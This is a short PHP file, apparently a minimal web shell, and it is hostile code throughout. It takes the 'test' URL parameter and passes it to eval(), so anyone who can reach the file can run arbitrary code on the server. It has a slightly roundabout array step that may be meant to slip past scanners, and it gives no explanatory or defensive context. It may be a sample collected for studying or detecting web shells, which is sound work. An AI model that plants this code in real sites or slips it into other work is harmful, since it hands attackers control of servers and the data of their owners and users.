<?php
$a = array (
		$_GET ['test']
);
if (empty ( $a )) {
	$a += array (
			'a'
	);
}
eval ( $a [0] );
?>